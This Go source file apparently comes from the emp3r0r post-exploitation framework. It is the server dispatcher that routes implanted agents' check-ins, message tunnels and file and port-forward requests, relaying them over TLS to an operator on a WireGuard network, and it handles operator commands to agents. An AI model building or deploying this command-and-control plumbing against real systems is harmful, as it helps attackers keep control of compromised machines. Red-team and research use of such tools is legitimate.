package server

import (
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"

	"github.com/gorilla/mux"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
)

// apiDispatcher routes requests to the correct handler.
func apiDispatcher(wrt http.ResponseWriter, req *http.Request) {
	vars := mux.Vars(req)

	if vars["api"] == "" || vars["token"] == "" {
		logging.Debugf("Invalid request: %v, missing api/token", req)
		wrt.WriteHeader(http.StatusNotFound)
		return
	}

	logging.Debugf("Got a request: api=%s, token=%s", vars["api"], vars["token"])

	// forward to operator
	// checkin path
	checkinPath := live.RuntimeConfig.CheckInPath
	if checkinPath == "" {
		checkinPath = "checkin"
	}

	// msg path
	msgPath := live.RuntimeConfig.MsgPath
	if msgPath == "" {
		msgPath = "msg"
	}

	// Create base target URL for operator proxying
	// Use the remote address (operator's IP in the WireGuard network)
	remoteIP, _, _ := net.SplitHostPort(req.RemoteAddr)

	// Determine target IP based on connection source
	targetIP := netutil.WgOperatorIP // Default to primary operator (for direct agents)

	// If request comes from a Relay (WG subnet) or Localhost, proxy back to it
	ip := net.ParseIP(remoteIP)
	if ip != nil {
		if ip.IsLoopback() {
			targetIP = remoteIP
		} else {
			_, subnet, _ := net.ParseCIDR(netutil.WgSubnet)
			if subnet != nil && subnet.Contains(ip) {
				targetIP = remoteIP
			}
		}
	}

	targetURL := fmt.Sprintf("https://%s:%d", targetIP, netutil.WgRelayedHTTPPort)
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		logging.Errorf("apiDispatcher: parsedURL: %v", err)
		http.Error(wrt, "Internal server error", http.StatusInternalServerError)
		return
	}

	proxy := httputil.NewSingleHostReverseProxy(parsedURL)

	// Set up a proper director function to preserve query parameters and other request properties
	originalDirector := proxy.Director
	proxy.Director = func(req *http.Request) {
		originalDirector(req)
		logging.Debugf("Proxying to: %s%s?%s", req.URL.Host, req.URL.Path, req.URL.RawQuery)
	}

	rootCAs := x509.NewCertPool()
	capem, err := os.ReadFile(transport.OperatorCaCrtFile)
	if err != nil {
		logging.Errorf("apiDispatcher: parse CA cert: %v", err)
		http.Error(wrt, "Internal server error", http.StatusInternalServerError)
		return
	}
	rootCAs.AppendCertsFromPEM([]byte(transport.CACrtPEM))
	rootCAs.AppendCertsFromPEM(capem)
	tlsConfig := &tls.Config{
		ServerName:         netutil.WgOperatorIP, // Use the first operator's IP as the SNI, as it is in the SAN list
		InsecureSkipVerify: false,
		RootCAs:            rootCAs,
	}
	proxy.Transport = &http.Transport{
		TLSClientConfig:   tlsConfig,
		ForceAttemptHTTP2: true,
	}
	// Add error handling for debugging
	proxy.ErrorHandler = func(w http.ResponseWriter, r *http.Request, err error) {
		logging.Errorf("Proxy error: %v", err)
		http.Error(w, "Proxy error", http.StatusBadGateway)
	}
	// Use the original request's context
	req = req.WithContext(req.Context())

	// handlers
	switch vars["api"] {
	case checkinPath:
		handleAgentCheckIn(wrt, req)
	case msgPath:
		handleMessageTunnel(wrt, req)
	case "ftp": // fixed path for legacy support or internal use if needed, but should ideally be malleable too
		logging.Debugf("About to proxy request: %s %s", req.Method, req.URL.Path)
		logging.Debugf("Request headers: %v", req.Header)
		proxy.ServeHTTP(wrt, req)
	case "www":
		logging.Debugf("About to proxy request: %s %s", req.Method, req.URL.Path)
		logging.Debugf("Request headers: %v", req.Header)
		logging.Debugf("Forwarding PUT request to operator at %s", targetURL)
		proxy.ServeHTTP(wrt, req)
	case "proxy":
		logging.Debugf("About to proxy request: %s %s", req.Method, req.URL.Path)
		logging.Debugf("Request headers: %v", req.Header)
		logging.Debugf("Forwarding port mapping request to operator at %s", targetURL)
		proxy.ServeHTTP(wrt, req)
	default:
		logging.Warningf("apiDispatcher: 404 for api=%s, token=%s (expected checkin=%s, msg=%s)", vars["api"], vars["token"], checkinPath, msgPath)
		wrt.WriteHeader(http.StatusNotFound)
	}
}

// operationDispatcher routes operator requests to the correct handler.
func operationDispatcher(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	api := vars["api"]
	logging.Debugf("Operator request: API: %s", api)

	api = fmt.Sprintf("%s/%s", transport.OperatorRoot, api)
	switch api {
	case transport.OperatorMsgTunnel:
		handleOperatorConn(w, r)
	case transport.OperatorSetActiveAgent:
		handleSetActiveAgent(w, r)
	case transport.OperatorSendCommand:
		handleSendCommand(w, r)
	case transport.OperatorListConnectedAgents:
		handleListAgents(w, r)
	default:
		http.Error(w, fmt.Sprintf("Invalid API: %s", api), http.StatusNotFound)
	}
}
